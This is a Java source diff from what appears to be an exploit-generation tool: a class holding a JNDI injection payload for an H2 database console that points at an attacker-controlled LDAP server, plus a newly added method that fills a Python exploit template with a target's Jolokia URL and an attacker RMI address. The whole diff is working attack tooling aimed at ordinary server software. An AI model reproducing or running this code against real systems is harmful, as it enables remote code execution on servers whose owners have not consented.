@@ -18,6 +18,7 @@ import java.util.Objects;
 public class ClsComp {
     private String vpsIP;
     private String vpsPort;
+    private String address;
     private String b64payload;
     public String text;
     public String exp = "language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=ldap://%s:1389/src.main.template.JNDIObject.JNDIObject&user=&password=";
@@ -25,6 +26,10 @@ public class ClsComp {
     public ClsComp(String vpsIP,String vpsPort){
         this.vpsIP = vpsIP;
         this.vpsPort = vpsPort;
+    }
+    public ClsComp(String address,String vpsIP,String none){
+        this.vpsIP = vpsIP;
+        this.address = address;
     }
     public ClsComp(String b64payload){
         this.b64payload = b64payload;
@@ -55,6 +60,30 @@ public class ClsComp {
             callback.onResult(text);
         } catch (IOException e) {
             text = outfilename.lastIndexOf("/") + "文件写入失败";
+            callback.onResult(text);
+            e.printStackTrace();
+            return false;
+        }
+        return true;
+    }
+
+    public boolean modifyPythonFile(String filename, String outfilename, ResultCallback callback) {
+        String jolokiaUrl = address + "/jolokia";  // 替换的 jolokia URL
+        String rmiUrl = String.format("rmi://%s:1389/JolokiaRealm", vpsIP);  // 替换的 rmi URL
+        try {
+            String filepath = System.getProperty("user.dir") + "/src/main/template/" + filename;
+            String content = new String(Files.readAllBytes(Paths.get(filepath)));
+            String outpath = System.getProperty("user.dir") + "/resources/" + outfilename;
+
+            // 替换 Jolokia URL 和 RMI URL
+            content = content.replace("%s/jolokia", jolokiaUrl);
+            content = content.replace("rmi://%s:1389/JolokiaRealm", rmiUrl);
+
+            Files.write(Paths.get(outpath), content.getBytes());  // 写入文件
+            text = outfilename + "文件写入成功";
+            callback.onResult(text);
+        } catch (IOException e) {
+            text = outfilename + "文件写入失败";
             callback.onResult(text);
             e.printStackTrace();
             return false;
